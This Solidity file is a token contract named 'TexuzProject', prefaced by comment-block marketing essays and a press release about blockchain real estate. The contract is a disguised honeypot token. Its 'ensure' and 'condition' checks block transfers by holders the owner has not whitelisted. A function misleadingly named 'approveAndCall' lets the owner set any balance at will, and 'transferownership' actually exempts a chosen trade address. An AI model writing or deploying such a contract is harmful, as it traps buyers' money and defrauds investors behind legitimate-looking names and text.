/*
Texuz Project



HOW BLOCKCHAIN CAN TRANSFORM THE MANUFACTURING INDUSTRY?

Blockchain is a public electronic ledger built around a P2P system that can be shared among the disparate users, which helps create an unchangeable record of transactions that are stamped each time and linked with the previous one. Blockchain also makes it impossible or difficult to hack, change, and cheat the system.
Blockchain is majorly associated with cryptocurrencies like Bitcoin, and it is a digital ledger technology that is commonly used to record and store transactions. Blockchain is also referred to as a digital ledger.

Blockchain Transforming Manufacturing Industry
The demand for Blockchain in the manufacturing supply chain has been increased a lot and in other industries. Blockchain can create a revolution in all sectors. Some of the industries which have the immense benefits from it are –
Banking and finance
Healthcare
Real estate
Security
Manufacturing industries
Role of Blockchain in the manufacturing industry
While talking about modern ways of manufacturing industries, the supply chain can run across several organizations. This makes the system difficult to find ways for increasing efficiency and for chasing events. But when it comes to Blockchain, it can help to make a secure and smarter supply chain moreover you can track the journey of the product. For instance, if you are looking for material delivery, you can easily track the material. Everything is recorded in Blockchain as a block.
There are several benefits of Blockchain technology, and here are some of the advantages which work in the real scenario-
Amplify Inventory Management
Blockchain provides permanent data for each transaction that takes place in the process of the supply chain. It also helps you to connect with the value chain, be it a production site, suppliers, and distribution centers. The records are easily accessible for those who are connected with the network. Everyone in the network has the information; therefore, no confusion occurs in the supply chain.
Upgraded data security
Information such as contact details and invoices which are exchanged in the supply chain process is highly confidential. Sharing these details by the traditional methods can be highly risky can anyone can hack this information efficiently. Instead, blockchains use these traditional methods to keep the information more secure in cryptography techniques. You can choose the applications of Blockchain in manufacturing to avoid the cyber attack.
Better Transparency And Traceability
Blockchain technology in manufacturing or supply chain can offer all the information related to the transaction. For example, how the products are manufactured, from where they are shipped, how data are managed, etc. if you have the permanent data, then it can be shared with the supply chain network easily. You only need to have the tracking tracing abilities.
Automatic Payment Process
Blockchain in industrial automation helps in transferring the funds to any part of the world. Now you don’t have to stick to the traditional methods of banking. Money transfers can be direct between the payee and payer. The payment system throughout the Blockchain technology is secured, and it can be done quickly. You don’t have to wait for the payments.
Improved Customer Engagement
Blockchain is much stronger than typical technology. You can analyze the data to create predictions and forecasts that can help you solve issues in your supply chain management. Moreover, analytical tools can also help to boost customer satisfaction. Blockchain can be used to find ways to develop your delivery timelines. To a certain extent, customers can also access Blockchain data.

Blockchain is suitable for every industry which has a high value, risk and is highly regulated. There are lists of benefits that help prevent tampering and counterfeiting the data, and it also offers preventive maintenance by identifying where, when, and how the failure occurs. Texuz can help you with this



Texuz Launches Real Estate Platform on Tezos blockchain
Today, Texuz announced that it is building a real estate investment platform on the Tezos blockchain to issue and manage digital tokens representing real estate assets.
The new platform will give investors direct access to a cutting-edge asset class to add to their investment portfolios. The platform will involve the acquisition of real estate assets, placing these assets on the Tezos blockchain, and tokenizing them. By building on Tezos, Texuz’s platform will provide users with industry-leading security, by leveraging Tezos’ unique use of formal verification to guarantee the validity of code, a technique used for mission-critical industries like aerospace. The platform will enable transparent and streamlined transactions, with real-time data integrated into the platform.
Haitham AlHammadi, COO, of Texuz, said, “The readiness and ease-of-use of the Tezos platform, along with its robust security standards, gives us an infrastructure and the capability of adapting to our business model. Tezos has also recently acquired a shariah compliance certificate which enables us to offer 100 percent, sharia-compliant investment option to our investors. This will help us widen our investor scope.”
Added Waleed Rassuli, Head of Tezos Gulf, “We’re thrilled to work with Texuz to bring digital asset infrastructure to the GCC region. This collaboration shows the possibilities for blockchain-based digital asset use cases, and Tezos’ recent Sharia certification, we’re confident that we can bring access to this asset class to a wider audience than ever before.”
Blockchain adoption is growing overall in the GCC region, according to AlHammadi. He added, “UAE has been the front runner by creating regulatory bodies and issuing operating licenses in various sectors and is the only jurisdiction to do that in the GCC.”
Texuz has applied for licensing approval from Dubai International Financial Centre to offer CAT4 crowdfunding in real estate.
About Texuz
Texuz is a fully owned subsidiary of Texuz, a company operating in UAE and KSA. Texuz specializes in Web, mobile & enterprise solution development using emerging technologies like Blockchain, Artificial Intelligence, Machine Learning, and IoT. With Industry noted professionals from KSA and UAE on the advisory board, Texuz is creating user adoption products focusing on the GCC region. Texuz will be the flagship product offering from the Texuz products list in the Blockchain adoption use cases. For more information, visit: smartchain.me
About Tezos
Tezos is a decentralized, public blockchain that evolves by upgrading itself. Stakeholders of the Tezos network vote on amendments to the protocol to reach social consensus on proposals, creating a secure and organic upgrading mechanism. The protocol’s on-chain governance system, its consensus algorithm based on Proof-of-Stake (PoS), and its ability to facilitate formal verification of smart contracts, make Tezos an ideal long-term solution for high-value financial applications. Learn more about Tezos at https://tezos.com.
About Tezos Gulf
Based in DIFC Dubai, Tezos Gulf is a subsidiary of the Swiss-based Tezos Foundation that was established to foster and support the growth of the Tezos ecosystem of people and products in the Middle East region.





What is the future of AI in Manufacturing Industries?

Besides a multitude of industries like banking, commercial, government, and retail, AI is being extensively used and now gradually invading the manufacturing sector. One of the best things about artificial intelligence is that it has machines or bots that may let you reap benefits like enhanced production, new opportunities, and reduced human effort.
From the shortage of professionals to complexity in making business-oriented decisions and issues related to integration, AI has conquered many internal challenges.
So, without wasting time, let’s discuss how AI is helping the manufacturing sector to grow to an unprecedented scale.
AI: Future Of Manufacturing
1. Directed Automation
AI bots may easily manage multiple tasks, design the production model, build automation solutions, and eliminate human effort and error while delivering the best quality assurance.
2. 24x7 Production
While manpower can work for a limited period of time (8–9 hours), robots and machines can perform the same operation 24x7 and at a much faster rate.
3. Safer Operational Environment
Incorporating AI means fewer human resources are required to carry out extensive laborious tasks and without any hassle.
4. Novel Opportunities for Humans
As AI can easily handle the manufacturing tasks, employees can now focus on other core operations of the business.
5. Condensed Operating Costs
As intelligent machines start managing daily activities, businesses can enjoy considerably lower operating costs.
6. Added Benefits of AI
Bots can easily gather and extract data, acknowledge patterns, learn and adapt to new things or environments through machine intelligence, learning, and speech recognition. Manufacturers can harness AI:
Make quick business decisions
Enhanced production outcomes
Advance process effectiveness
Reduce the cost of operation
Facilitate superior scalability
Facilitate product development
The Growth of Manufacturing Industry with Mushrooming AI
The continued enhancement in the manufacturing sector has been used for QA to detect product faults in real-time. While plant managers do not want to pay employees to enter information, AI with computer vision may help you to rationalize how information can be obtained.
Final Thoughts
Artificial intelligence could be an incredibly important solution in creating things, enhancing them, and making them cost-effective for business growth. But it couldn’t be wrong to say that is no replacement for human ingenuity in dealing with the unexpected changes in tastes and demands — or in deciding what decision you can make.


How is Blockchain Transforming the Real Estate Industry?


Technological developments have shaken up the current scenario, and one such innovation is none other than Blockchain. Gone are the days when real estate transactions are often conducted via conventional mediums, majorly involve face-to-face interactions across different entities. Blockchain, however, enables assets like real estate to be tokenized and be traded like cryptocurrencies.

Let’s discuss the ways in which blockchain is transforming the real estate industry:
1. Platforms and Marketplaces
Since real estate technology introduced in the market, it was primarily concerned with buyers and sellers. With the introduction of blockchain, unconventional ways to trade real estate will enable trading platforms and online marketplaces to streamline transactions in an efficient manner.
For example, Aqar Chain has developed a platform that uses blockchain technology to facilitate real estate by providing investors with a quick way to invest without undergoing regulatory burdens. The platform facilitates a streamlined gateway for investors to participate in global real estate investments whilst benefiting from rising cryptocurrency markets.
2. Liquidity
Since real estate takes time for sales to conclude, it has long been considered an illiquid asset. With blockchain, cryptocurrencies and tokens can easily be traded through exchanges. And the best part is that seller doesn’t have to wait for a buyer that can afford the whole property in order to get some value out of their property.
3. Eliminate Intermediaries
It couldn’t be wrong to say that banks and brokers have been a part of the real estate industry for decades. But with blockchain, there’s likely to be a paradigm shift in real estate transactions. As some of the functions like listings, payments, and legal documentation can effortlessly be handled, this would eliminate intermediaries. And as a result, this will save significant upfront costs charged by these intermediaries. And not to forget the process will get hassle-free.
4. Fractional Ownership
Blockchain helps to eliminate the barriers to real estate investing. When it comes to acquiring property, investments need significant money. By allowing fractional ownership, investors can pool their money to acquire bigger ticket properties. With the help of blockchain, investors can easily access a trading app to buy and sell the token that perfectly caters to their needs and budget.
5. Decentralization
There’s no arguing with the fact that blockchain commands trust and security as a decentralized technology. The information is stored in the blockchain is accessible to all peers on the network, making data transparent. And when the information is verifiable to peers, buyers and sellers can easily conduct transactions. This would also help in eliminating fraud attempts to an unprecedented scale.
Conclusion
Global real estate is currently dominated by corporate giants. With the adoption of blockchain, more and more people may access the market, making transactions secure and transparent. With blockchain-powered platforms like Texuz, inefficiencies of conventional real estate investing would be eliminated.



What are the Top Habits of Wealthy Real Estate Entrepreneurs?


Do you want to join the list of top real estate entrepreneurs? If so, this post is going to help achieve success without any difficulty.
Investing in real estate could be potentially daunting and risky. Investors, nowadays, earn profit by efficient property management, joint ventures, wholesaling, to name a few. To accomplish your goals, you need to be a little savvy to become successful.
But luckily, there are people who have shared their practices, views, and methods that may help an investor to get what they want.
*/
pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract TexuzProject {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}